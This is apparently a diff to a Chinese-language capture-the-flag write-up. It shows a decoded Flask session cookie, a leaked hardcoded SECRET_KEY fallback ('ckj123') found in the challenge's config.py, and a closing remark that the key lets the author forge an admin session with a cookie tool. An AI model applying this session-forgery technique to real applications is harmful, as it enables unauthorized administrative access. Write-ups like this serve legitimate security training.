@@ -120,3 +120,8 @@ PS D:\webtool\flask-session-cookie-manager> python .\flask_session_cookie_manage
 #b'{"_fresh":true,"_id":{" b":"M2Q4ZWMzZjY4NWRhYmM3YWI0OTcwYzg1MzZmMDYxOGQ5N2I2MWZiMzQwN2RmZTYxYTllZjNjNjBmYzEyMjM0YjIzYzRmOWU4Y2E0MDVlN2NhZDA2ZjczNDJhYTQzZGEzOWE1YjdkYThlODNhZmUyM2ZlYWI4OTFmMDFhOWE2OGM="},"csrf_token":{" b":"ZDFiZGY0MzJkNTJiMTY2ZGNlODM2ZTYzNjdmYzBlMWM3ZTk2YWQ3ZA=="},"image":{" b":"RFJkaQ=="},"name":"123","user_id":"10"}'
 
 ```
+这里不知道那里找`secret_key`，看wp原来是源码里面还有一个`config.py`文件里面有key泄露
+```python
+SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
+```
+拿到key之后直接用工具伪造admin的session就好了
